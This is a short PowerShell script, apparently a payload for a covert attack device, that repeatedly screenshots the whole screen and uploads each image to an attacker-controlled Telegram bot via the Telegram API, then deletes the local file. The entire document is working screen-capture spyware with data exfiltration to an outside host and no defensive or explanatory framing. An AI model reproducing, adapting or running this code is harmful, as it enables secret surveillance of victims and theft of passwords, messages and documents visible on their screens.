
$seconds = 30 # Screenshot interval
$a = 1 # Sceenshot amount

$Token = "$tg"
$URL='https://api.telegram.org/bot{0}' -f $Token 
while($chatID.length -eq 0){
$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
Sleep 10
}

While ($a -gt 0){

Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
$filePath = "$env:temp\sc.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $filePath

Start-Sleep $seconds
$a--
}
